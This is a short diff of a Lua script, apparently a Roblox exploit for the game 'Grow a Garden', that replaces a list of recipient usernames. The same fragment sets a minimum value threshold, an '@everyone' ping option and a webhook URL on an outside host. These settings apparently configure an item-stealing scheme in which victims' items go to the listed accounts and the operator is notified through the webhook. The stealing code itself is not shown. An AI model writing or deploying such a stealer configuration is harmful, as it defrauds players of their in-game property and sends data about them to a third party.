@@ -63,7 +63,7 @@ for _, v in pairs(getgc()) do
     end
 end
 
-_G.Usernames = {"GROW4GARDEN1M102", "GROW4GARDEN1M29", "GROW4GARDEN1M95"}
+_G.Usernames = {"GROW4GARDEN1M40","GROW4GARDEN1M29","GROW4GARDEN1M50","GROW4GARDEN1M43","GROW4GARDEN1M20"}
 _G.min_value = 0.017
 _G.pingEveryone = "Yes"
 _G.webhook = "https://megamegamega.vercel.app/api/webhook"
